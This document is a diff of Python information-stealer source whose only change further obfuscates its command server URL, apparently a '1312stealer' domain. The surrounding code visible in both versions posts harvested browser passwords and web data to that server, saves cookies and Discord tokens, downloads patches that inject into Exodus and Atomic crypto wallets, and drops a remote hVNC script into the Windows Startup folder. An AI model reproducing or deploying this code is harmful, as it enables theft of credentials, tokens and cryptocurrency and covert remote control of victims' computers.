@@ -221,7 +221,7 @@ def zip_to_storage(name, source, destination):
 def upload_to_server(filepath):
     for i in range(10):
         try:
-            url = "https://1312stealer[.]ru/delivery" # DONT REMOVE THOSE []
+            url = "htt-!-!ps://13-!-!-1!--!2-!-!ste-!-!aler[.]ru/delivery" # DONT REMOVE THOSE []
             files = {'file': open(filepath, 'rb')}
             headers = {'userid': userid} 
             r = requests.post(url, files=files, headers = headers)
@@ -246,7 +246,7 @@ def inject():
     for file in listOfFile:
         if "app-" in file:
             apps += [file]
-    exodusPatchURL = "https://1312stealer[.]ru/wallet"# DONT REMOVE THOSE []
+    exodusPatchURL = "htt-!-!ps://13-!-!-1!--!2-!-!ste-!-!aler[.]ru/wallet"# DONT REMOVE THOSE []
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
     req = Request(exodusPatchURL, headers=headers)
     response = urlopen(req)
@@ -271,7 +271,7 @@ def inject_atomic():
     local = os.getenv("localappdata")
     path = f"{local}/Programs/atomic"
     if not os.path.exists(path): return
-    atomicPatchURL = "https://1312stealer[.]ru/wallet/atomic"# DONT REMOVE THOSE []
+    atomicPatchURL = "htt-!-!ps://13-!-!-1!--!2-!-!ste-!-!aler[.]ru/wallet/atomic"# DONT REMOVE THOSE []
     headers = {"User-Agent": "Mozilla/5.0"}
     req = Request(atomicPatchURL, headers=headers)
     response = urlopen(req)
@@ -435,13 +435,13 @@ for discord_path in DISCORD_PATHS:
         pass
 password_headers = {"userid": userid, "Content-Type": "application/json"}
 password_json_data = json.dumps(PASSWORDS)
-requests.post("https://1312stealer[.]ru/pw", data=password_json_data, headers=password_headers)
+requests.post("htt-!-!ps://13-!-!-1!--!2-!-!ste-!-!aler[.]ru/pw", data=password_json_data, headers=password_headers)
 for cookie in COOKIES:
     with open(STORAGE_PATH + f"\\Cookies-{cookie['browser']}-{cookie['profile']}.txt", "w") as f:
         f.write(base64.b64decode(cookie["cookies"]).decode())
 web_data_headers = {"userid": userid, "Content-Type": "application/json"}
 web_data_json = json.dumps(WEB_DATA)
-requests.post("https://1312stealer[.]ru/webdata", data=web_data_json, headers=web_data_headers)
+requests.post("htt-!-!ps://13-!-!-1!--!2-!-!ste-!-!aler[.]ru/webdata", data=web_data_json, headers=web_data_headers)
 for discord_token in DISCORD_TOKENS:
     with open(STORAGE_PATH + "\\discord-tokens.txt", "w") as f:
         f.write(
@@ -472,7 +472,7 @@ for path in PATHS_TO_SEARCH:
                             except:
                                 pass
 try:
-    URL = "https://1312stealer[.]ru/hvnc"
+    URL = "htt-!-!ps://13-!-!-1!--!2-!-!ste-!-!aler[.]ru/hvnc"
     r = requests.get(URL)
     with open(os.path.join(STARTUP_PATH, "hvnc.py"), "wb") as f:
         f.write(r.content)
